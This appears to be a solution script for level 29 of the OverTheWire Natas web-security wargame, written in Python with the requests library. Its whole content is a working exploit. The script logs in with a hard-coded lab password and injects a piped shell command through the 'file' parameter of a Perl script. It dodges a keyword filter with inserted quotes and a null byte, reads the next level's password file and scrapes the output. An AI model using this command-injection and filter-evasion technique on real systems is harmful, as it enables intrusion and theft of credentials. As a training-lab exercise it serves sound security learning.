#/bin/python
import requests
import re

url = "http://natas29.natas.labs.overthewire.org/"
s = requests.Session()
s.auth = ('natas29', 'airooCaiseiyee8he8xongien9euhe8b')

r = s.get(url+'index.pl?file=|cat+/etc/n%22%22atas_webpass/n%22%22atas30%00')
#print(r.text)
print(re.findall('</html>\n(.*)',r.text)[0])